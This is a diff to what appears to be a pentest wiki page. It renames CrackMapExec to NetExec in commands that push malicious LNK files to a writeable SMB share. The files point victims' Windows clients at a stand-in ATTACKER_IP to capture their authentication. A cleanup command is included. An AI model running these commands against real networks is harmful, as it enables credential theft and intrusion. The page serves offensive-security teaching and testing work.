@@ -138,14 +138,14 @@ $lnk.Save()
 * LNK files can be mixed with some HTA: [LNK HTA Polyglot](https://hatching.io/blog/lnk-hta-polyglot/)
 {% endhint %}
 
-[CrackMapExec](https://github.com/mpgn/CrackMapExec) (Python) can be used to automatically push LNK files to a writeable share.
+[NetExec](https://github.com/Pennyw0rth/NetExec) (Python) can be used to automatically push LNK files to a writeable share.
 
 ```bash
 # Creation & upload
-cme smb "target" -d "domain" -u "user" -p "password" -M slinky -O NAME="SHARE" SERVER="ATTACKER_IP"
+nxc smb "target" -d "domain" -u "user" -p "password" -M slinky -O NAME="SHARE" SERVER="ATTACKER_IP"
 
 # Cleanup
-cme smb "target" -d "domain" -u "user" -p "password" -M slinky -O NAME="SHARE" SERVER="ATTACKER_IP" CLEANUP=True
+nxc smb "target" -d "domain" -u "user" -p "password" -M slinky -O NAME="SHARE" SERVER="ATTACKER_IP" CLEANUP=True
 ```
 {% endtab %}
 
